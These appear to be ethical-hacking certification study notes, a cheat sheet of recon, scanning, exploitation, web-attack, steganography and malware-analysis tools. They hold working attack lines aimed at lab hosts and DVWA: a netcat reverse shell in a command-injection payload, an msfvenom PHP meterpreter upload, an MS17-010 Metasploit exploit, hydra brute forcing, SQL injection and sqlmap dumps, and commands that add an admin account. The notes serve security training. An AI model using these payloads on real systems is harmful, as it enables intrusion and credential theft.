

**Footprinting and reconnaissance**
1. Google Dorking and Other Search Engines
	1. Commands
		1. site - from address
		2. inurl - word in url
		3. filetype
		4. intitle: e.g. index of
	2. Resources:
		3. https://www.exploit-db.com/google-hacking-database
	3. Advanced search:
		1. https://www.google.com/advanced_search
	4. Other engines:
		1. bing, yandex, baidu, duckduckgo
2. Dir Busting and VHost enumeration
	1. Sudo apt install seclists
	2. dirbusting:
		1. gobuster dir ‐u http://10.10.10.10 ‐w /usr/share/wordlists/dirbuster/directory‐list‐2.3‐medium.txt
		2. ffuf ‐u http://10.10.10.10/FUZZ ‐w /usr/share/wordlists/dirbuster/directory‐list‐2.3‐medium.txt
	3. finding files:
		1. gobuster dir ‐u http://10.10.10.10 ‐w /usr/share/wordlists/dirbuster/directory‐list‐2.3‐medium.txt ‐x .html,.css,.js
		2. ffuf ‐u http://10.10.10.10/FUZZ ‐w /usr/share/wordlists/dirbuster/directory‐list‐2.3‐medium.txt –e .html,.css,.js,.conf
	4. vhost enumeration:
		1. gobuster vhost ‐u http://example.com ‐w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains‐top1million‐5000.txt ‐-append‐domain
		2. ffuf ‐u http://example.com ‐w /usr/share/seclists/Discovery/DNS/subdomains‐top1million‐20000.txt ‐H "HOST:FUZZ.example.com"
3. subdomain enumeration
	1. https cert lookup
4. passive reconnaissance with digital certificates
	1. search engines:
		1. https://crt.sh/
		2. https://ui.ctsearch.entrust.com/ui/ctsearchui
		3. https://search.censys.io/
5. DNS footprinting and enumeration
	1. DNS Record types:
		1. A - address IPv4
		2. AAAA - address IPv6
		3. CNAME - Canonical Name
		4. MX - Main Exchanger
		5. NS - Nameserver
		6. PTR - pointer 
		7. SOA - start of authority
		8. SRV - service location
		9. TXT - Text
		10. AXFR - zone transfer (includes all)
	2. Tools:
		1. dig
			1. $ dig zonetransfer.me
			2. $ dig ns zonetransfer.me #(Name server)
			3. $ dig mx zonetransfer.me #(Mail server)
			4. $ dig cname zonetransfer.me #(cname record
			5. $ dig ns zonetransfer.me #(zone transfer)
			6. dig axfr zonetransfer.me @nsztm2.digi.ninja #(zone transfer)
		2. host:
			1. $ host zonetransfer.me
			2. $ host -t ns zonetransfer.me #(Name server)
			3. $ host -t mx zonetransfer.me #(Mail server)
			4. $ host 192.168.2.2 #(reverse lookup)
			5. $ host -t ns zonetransfer.me #(zone transfer)
			6. $ host –l zonetransfer.me nsztm2.digi.ninja #(zone transfer)
		3. nslookup:
			1. $ nslookup zonetransfer.me
			2. $ nslookup
				1. > Set type=ns
				2. > zonetransfer.me
			3. $ >nslookup #(zone transfer)
				1. > set type=ns
				2. zonetranfer.me
				3. server nsztm2.digi.ninja
				4. set type=any
				5. >ls –d zonetransfer.me
		4. dnsrecon:
			1. $ dnsrecon –d zonetransfer.me –t axfr
		5. dnsenum:
			1. $ dnsenum zonetransfer.me
		6. fierce:
			1. fierce --domain zonetransfer.me
6. DNS bruteforcing
	1. nmap:
		1. $ nmap -p 53 --script dns-brute zonetransfer.me
	2. dnsmap:
		1. $ dnsmap zonetransfer.me -w /usr/share/seclists/discovery/DNS/fierce-hostlists.txt
	3. fierce:
		1. $ fierce --domain zonetransfer.me --subdomain-file /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt

**Scanning and Enumeration** 

1. Identyfying Live Hosts & Service and OS Discovery
	1. netdiscover:
		1. $ netdiscover -i (network interface name)
	2. nmap:
		1. $ nmap –sn 192.168.18.1/24 #(ping scan)
		2. $ nmap -sn -PR 192.168.18.0-255 #(arp scan)
		3. $ nmap -sn -PU 192.168.18.110 #(UDP ping scan)
		4. $ nmap -sn -PE 192.168.18.1-255 #(ICMP Echo Ping scan)
		5. $ nmap -sn -PM 192.168.18.1-255 #(Mask Ping scan (use if ICMP is blocked))
		6. $ nmap -sn -PP 192.168.18.1-255 #(ICMP timestamp scan)
		7. $ nmap -sn -PS 192.168.18.1-255 #(tcp syn ping scan)
		8. $ nmap -sn -PO 192.168.18.1-255 #(IP protocol scan.use different protocols to test the connectivity)
		9. $ nmap –sS –sV 192.168.18.1/24 #(sS - tcp stealth, sV - version enumeration)
		10. $ nmap –sS –O 192.168.18.1 #(os discovery)
		11. $ sudo nmap --script smb-os-discovery.nse 192.168.18.110 #(os discovery via SMB)
		12. $ sudo nmap –sS –p 445 –A 192.168.18.1 #(A - aggressive scan)
	3. Angry IP Scanner (ipscan)
		4. Combined UDP+TCP
	4. hping:
		1. $ hping3 -S 192.168.18.110 -p 80 -c 5 #(c - number of packets)
	5. ping 192.168.18.110
		1. Manual banner grabbing:
			1. Linux (TTL: 64, TCP WindowSize: 5840)
			2. FreeBSD (TTL: 64, TCP WindowSize: 65535)
			3. OpenBSD (TTL: 255, TCP WindowSize: 16384)
			4. Windows (TTL: 128, TCP WindowSize: 65535 b - 1 Gb)
			5. Cisco routers (TTL: 255, TCP WindowSize: 4128)
			6. Solaris (TTL: 255, TCP WindowSize: 8760)
			7. AIX (TTL: 255, TCP WindowSize: 16384)
2. NetBios enumeration
	1. Netbios
		1. legacy networking protocol, unique names, shared resources, vulnerabilities, network configuration
		2. ports: UDP 137, UDP 138, sometimes UDP 139
	2. nbtstat
		1. windows!
		2. $ nbtstat -a 192.168.18.110 (enumerate names)
		3. $ nbtstat -c (check cache)
	3. nmap:
		1. $ nmap -sV -v --script nbstat.nse 192.168.18.110 #(version enumeration)
		2. $ nmap -sU -p 137 --script nbstat.nse 192.168.18.110 #(udp scan)
3. SMB enumeration
	1. SMB:
		1. network file sharing protocol
		2. ports: TCP 445, UDP 137-138, TCP 139 (legacy)
	2. nmap:
		1. $ sudo nmap -A –p 445 192.168.18.110
		2. $ sudo nmap --script smb-os-discovery.nse 192.168.18.110
		3. $ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.18.110
		4. $ ls /usr/share/nmap/scripts | grep smb
	3. enum4linux:
		1. $ enum4linux -a 192.168.18.110

**System Hacking** 

1. Metasploit:
	1. nmap –A –sC 192.168.1.2 #( -sC nmap default scripts )
	2. msfconsole
		1. search
		2. use exploit/windows/smb/ms17_010_psexec
		3. show options
		4. set RHOSTS 192.168.1.2
		5. exploit
2. Scanning Network
	1. Port states:
		1. open - indicates that an application is listening for connections on the port. The primary goal of port scanning is to find these.
		2. closed - indicates that the probes were received but there is no application listening on the port
		3. filtered - indicates that the probes were not received, and the state could not be established.
		4. unfiltered - indicates that the probes were received but a state could not be established. In other words, a port is accessible, but Nmap is unable to determine whether it is open or closed.
		5. open|filtered - indicates that the port was filtered or open, but Nmap couldn’t establish the state
		6. closed|filtered - indicates that Nmap is unable to determine whether a port is closed or filtered
	2. TCP Header:
		1. 20-60 bytes
			1. Source port address: 16 bits, destination port address: 16 bits
			2. Sequence number: 32 bits
			3. Acknowledgement number: 32 bits
			4. HLEN: 4 bits, Reversed: 6 bits, URG/ACK/PSH/RST/SYN/FIN, Windows size: 16 bits
			5. Checksum: 16 bits, Urgent pointer: 16 bits
			6. Options and padding
	3. TCP Handshake:
		1. SYN -> SYN+ACK -> ACK
	4. Connection termination
		1. FIN -> FIN+ACK -> ACK
	5. Scan types:
		1. -sA - ACK scan
		2. -sF - FIN scan
		3. -sI - IDLE scan
		4. -sL - DNS scan (list scan)
		5. -sN - NULL scan
		6. -sO - Protocal scan
		7. -sP - Ping scan
		8. -sR - RPC scan
		9. -sS - SYN scan
		10. -sT - TCP Connect scan
		11. -sW - TCP Window port scan
		12. -sX - XMAS scan
		13. -PI - ICMP ping
		14. -Po - No ping
		15. -PS - SYN ping
		16. -PT - TCP ping
		17. -oN - Normal output
		18. -oX - XML output
		19. -T0 - serial slowest scan
		20. -T1 - serial slowest scan
		21. -T2 - serial normal speed scan
		22. -T3 - parallel normal speed scan
		23. -T4 - parallel, fast scan
		24. -sn - disable port scanning
		25. -iL - scan targets from file (next arg)
		26. -iR 100 - scan 100 random hosts
		27. --exclude - exclude listed hosts
		28. -sM - TCP maimon scan
		29. -Pn - disable host discovery - port scan only
		30. -PA - TCP ACK discovery
		31. -PU - UDP discovery
		32. -PR - ARP discovery
		33. -n - never do DNS resolution
		34. -sV - version detection
		35. -b - FTP bounce attack
	6. -sU - UDP scan
		1. open - any UDP response from target port
		2. open|filtered - no response received (even after retransmission)
		3. closed - ICMP port unreachable error (type3, code3)
		4. filtered - other UCMP unreachable errors (type3, code 1,2,9,10 or 13)
	7. Host and port options:
		1. --excludefile <exclude_file>
	8. Ping options:
		1. -PE - ICMP echo request ping
		2. -PP - icmp timestamp ping
		3. -PM - icmp address mask ping
		4. -P0, -PN, -PD - don't ping
		5. -R - require reverse
		6. --dns-servers - specify DNS servers
	9. Real-time information options:
		1. --verbose, -v - verbose mode
		2. --version-trace 
		3. --packet-trace
		4. --debug, -d
		5. --interactive
		6. --noninteractive
	10. OS fingerprinting:
		1. -O - OS fingerprinting
		2. --osscan-limit - limit system scanning
		3. --osscan-guess, --fuzzy - more guessing flexibility
		4. -A - additional, advanced and Aggressive
3. Vulnerability Assessment
	1. searchsploit (@KaliLinux) - exploitDB
		1. e.g. searchsploit vsftpd 2.3.4
	2. Nessus
4. Post Exploitation
	1. meterpreter
		1. webcam_stream
		2. keyscan_scan
		3. screenshot
		4. screenshare
		5. run winenum
		6. shell
5. FTP exploitation
	1. ftp <ip_address>
	2. ls
	3. hydra ‐l mike ‐P /usr/share/wordlists/rockyou.txt –v 10.10.223.20 ftp 
6. SMB exploitation
	1. ports: 139, 445 - netbios-ssn, microsoft-ds
	2. sudo nmap ‐‐script smb‐os‐discovery.nse 10.10.50.26
	3. Smbclient ‐L
	4. Smbclient //10.10.50.26/share
7. Telnet Exploitation
	1. port 23
	2. telnet $IP $PORT
8. Privileges escalation in NFS
	1. nmap -sV --script=nfs-showmount 192.168.1.102
	2. apt-get install nfs-common && showmount -e 192.168.1.102


**Steganography and Hiding Activities**

1. Covert Communication Channels
	1. wget https://raw.githubusercontent.com/cudeso/security‐tools/master/networktools/covert/covert_tcp.c
		1. sudo apt install gcc
		2. cc ‐o covert_tcp covert_tcp.c
		3. sudo ./covert_tcp ‐dest 192.168.18.144 ‐source 192.168.18.95 ‐source_port 8888 ‐dest_port 9999 ‐server ‐file /home/user/msg1.txt
		4. sudo ./covert_tcp ‐dest 192.168.18.144 ‐source 192.168.18.95 ‐source_port 9999 ‐dest_port 8888 ‐file /home/kali/msg.txt
2. Hide Files Using Alternate Data Streams
	1. type calc.exe >readme.txt:calc.exe
	2. mklink backdoor.exe readme.txt:calc.exe
3. White Space Steganography - Snow
	1. https://darkside.com.au/snow/
	2. SNOW.EXE -C -m "Somename is my name" -p "magic" test.txt test2.txt
	3. SNOW.EXE -C -p "magic" test2.txt
4. Image steganography
	1. https://www.openstego.com/
	2. https://stegonline.georgeom.net/upload


**Hacking Web Applications and Web Servers**

1. Command Execution Vulnerabilities - Linux
	1. 127.0.0.1 && ls
	2. 127.0.0.1 & ls
	3. 127.0.0.1 ; ls
	4. 127.0.0.1 | ls
	5. 127.0.0.1 |ls
	6. 127.0.0.1 && nc ‐c sh 127.0.0.1 9001
2. Command Execution Vulnerabilities - Windows
	1. Hostname
	2. Whoami
	3. Tasklist
	4. Taskkill /PID 3112 /F
	5. dir c:\
	6. net user
	7. net user test /add
	8. net localgroup Administrators test /add
	9. net user test
	10. dir c:\ "pin.txt"
	11. ! Take pin.txt
	12. type c:\"pin.txt“
3. File Upload Vulnerabilities
	1. msfvenom ‐p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 ‐f raw >exploit.php
	2. >use exploit/multi/handler set payload
	3. >php/meterpreter/reverse_tcp
	4. >run
	5. Content Type Check
4. Brute Force WebApp passwords with burp and hydra
	1. Proxy -> Intruder (wordlist) -> Length
	2. hydra -l admin -P /usr/share/wordlists/john.lst 'http-get- form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q; security=low:F=Username and/orpassword incorrect'
	3. BurpSuite -> Pitchfork (wordlist + recursive grep) (Redirections = always)
5. Chaining Multiple Vulnerabilities
	1. vim -> GIF89a; (magic bytes)
	2. exploit.php.jpeg
6. SQL injection vulnerabilities 1
	1. ' OR 1=1 #
	2. sqlmap ‐r req.txt ‐‐dbs
	3. sqlmap ‐r req.txt ‐D dvwa ‐‐tables
	4. sqlmap ‐r req.txt ‐D dvwa ‐T users ‐‐columns
	5. sqlmap ‐r req.txt ‐D dvwa ‐T users ‐‐dump‐all
7. SQL injection vulnerabilities 2
	1. 1 UNION SELECT user, password FROM users#
	2. 1’ UNION SELECT user, password FROM users#
8. SQLmap
9. Hacking Wordpress Websites with WPScan
10. SQL injection on MSSQL db
11. SQL injection on MSSQL with SQLmap
	1. Other tools:
		1. mole
		2. blisqy
		3. blind-sql-bitshifting
		4. nosqlmap
12. Detect SQL injection vulnerabilities using DSSS
13. Detect SQL injection vulnerabilities using OWASP ZAP
	1. Other tools:
		1. acunetix web vulnerability scanner
		2. snort
		3. Burp Suite
		4. w3af


**Vulnerability Assessment**

1. Vulnerability research - CWE
	1. https://cwe.mitre.org
2. Vulnerability research - CVE
	1. https://cve.mitre.org/
3. Vulnerability research - NVD
	1. https://nvd.nist.gov/
4. OpenVAS
5. Nessus
6. Nikto CGI Scanner

**Malware analysis**

1. Introduction
	1. static analysis
	2. dynamic analysis
	3. code analysis
	4. behavioural analysis
2. Hybrid Analysis
	1. Other tools:
		1. Valkyrie
		2. Cuckoo sandbox
		3. Jotti
		4. IOBit Cloud
3. Strings in BinText
	1. Other tools:
		1. FLOSS
		2. Strings
		3. Free EXE DLL Resource Extract
		4. FileSeek
4. Packaging and Obfuscation Methods using PEid
5. ELF Executable File using Detect It Easy (DIE)
	1. Other Tools:
		1. Macto_Pack
		2. UPX
		3. ASPack
6. Portable Executable (PE) Information of a Malware Executable File
	1. Other Tools:
		1. Portable Executable Scanner (pescan)
		2. Resource Hacker
		3. PEView
7. File Dependencies using Dependency Walker
	1. DLLs:
		1. Kernel32.dll
		2. Advapi32.dll
		3. User32.dll
		4. Gdi32.dll
		5. Ntdll.dll
		6. WSock32.dll and Ws2_32.dll
		7. Wininet.dll
8. Malware Disassembly using IDA
9. Malware Disassembly using OllyDbg
10. Malware Disassembly using Ghidra
11. Control takeover using njRAT RAT Trojan
12. Trojan Server using Theef RAT Trojan
13. Virus infection using JPS Virus Maker Tool

**Sniffing and Packet Analysis with Wireshark**

1. Credentials extraction
2. DDOS detection
3. IoT traffic detection
4. Capturing and Analysing IoT traffic
5. MAC flooding using macof
6. DHCP starvation attack using Yersinia

**Hacking Mobile Platforms**

1. Android hacking with msfvenom
2. Android hacking with phonesploit over ADB
3. Phishing on Android with Social Engineering Toolkit
4. DoS attack from Android using LOIC
5. Android hacking using AndroRAT
6. Malicioius App using Online Android Analyzers

**Wifi Hacking**

1. Introduction to wifi hacking
2. Wifi hacking with Aircrack
3. Wireless attacks
4. Handshakes capturing with Hcxdumptool
5. Handshakes preparing for cracking
6. Wifi passwords cracking with hashcat
7. Wifi passwords cracking with FERN

**Cloud Security**

1. S3 buckets enumeration
2. Unauthenticated S3 buckets exploiting
3. Authenticated S3 buckets exploiting

**Cryptography**

1. Disk encryption using Veracrypt
2. File and Text MEssages Encryption using Cryptoforge
3. Fike encryption using Advanced encryption package
4. Enc / Dec using BCtextEncoder
5. Hashes on Windowos
6. Cryptanalysis using Cryptool

**Helpful resources**

